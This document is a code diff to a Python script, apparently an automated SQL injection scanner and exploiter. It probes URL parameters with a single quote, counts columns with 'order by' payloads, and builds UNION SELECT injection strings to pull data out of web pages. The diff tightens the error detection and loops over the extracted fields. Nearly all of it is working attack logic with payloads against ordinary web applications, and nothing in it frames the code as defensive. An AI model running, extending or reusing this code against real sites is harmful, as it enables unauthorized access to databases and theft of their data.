@@ -21,7 +21,10 @@ def check_if_data(id, response):
 
     if id == 1:
         try:
-            info_of_site = response.text[int(start[0])+4:int(end[0])]
+            for i in range(len(end)):
+                info_of_site = response.text[int(start[i])+4:int(end[i])]
+                if info_of_site[1:-1] not in list_of_queries:
+                    break
         except:
             pass
         data.append(info_of_site)
@@ -49,6 +52,8 @@ This function adds separation data to detect suitable response
 def final_check(id, url, param_for_payload, first_part_of_url, tup):
     end_of_url = ",3--+-"
     id -= 1
+
+    print(url)
 
     if id == 1:
         for i in tup:
@@ -114,25 +119,19 @@ This function do string input into url
 """
 def check_for_string(url, param_for_payload):
     #print("STRING: \n")
-    query = "order by 1' or 'x'='x"
-    resp = add_param(param_for_payload, query, url)
+    query = "1' order by {0} --+-"
+    id = 1
+    
+    resp = add_param(param_for_payload, query.format(id), url)
 
-    if "error" not in resp.text:
-        query = "-1+AND+1=2'UNION+ALL+SELECT+"
-        end_of_url = "'--+-"
+    while 'unknown column' not in resp.text.lower():
+        id += 1
+        resp = add_param(param_for_payload, query.format(id), url)
 
-        id = 1
+    id -= 1
 
-        query = query + str(1) + "," + end_of_url
-        resp = add_param(param_for_payload, query, url)
-        new_query = query
-
-        while 'Unknown' in resp.text or 'columns' in resp.text:
-            new_query += str(id) + ","
-            resp = add_param(param_for_payload, new_query + end_of_url, url)
-            id += 1
-
-        tup = put_param(id)
+    tup = put_param(id)
+    query = "-1'+and+1=2+UNION+SELECT"
 
     return final_check(id, url, param_for_payload, query, tup)
 
@@ -146,14 +145,14 @@ def check_for_int(url, param_for_payload):
     query = "1 order by "
     resp = requests.get(url)
 
-    while 'unknown' not in resp.text.lower():
+    while 'unknown column' not in resp.text.lower():
         new_query = query + str(id)
         resp = add_param(param_for_payload, new_query, url)
         id += 1
+        #print(id)
 
     id -= 2
     query = "-1+UNION+ALL+SELECT"
-
 
     tup = put_param(id)
     return final_check(id, url, param_for_payload, query, tup)
@@ -168,6 +167,7 @@ def do_job_url(url):
 
     try:
         param_for_payload = finds_parameter(url)
+        
         url = detect_parameter_in_url(url)
 
         """CHECK IF IT IS A STRING  OR INT """
@@ -180,13 +180,21 @@ def do_job_url(url):
             string += 1
 
         if string > 0:
-            check_type = check_for_string(url, param_for_payload)
+            query = "'"
+            resp = add_param(param_for_payload, query, url)
+
+            if "error" in resp.text.lower():
+                print(url, param_for_payload)
+                check_type = check_for_string(url, param_for_payload)
+            else:
+                return None
 
         elif "error" in resp.text.lower():
             query = "1 AND 1"
             resp = add_param(param_for_payload, query, url)  # check for int
 
             if "error" not in resp.text:
+                #print("yess", url, param_for_payload)
                 check_type = check_for_int(url, param_for_payload)
 
         return check_type
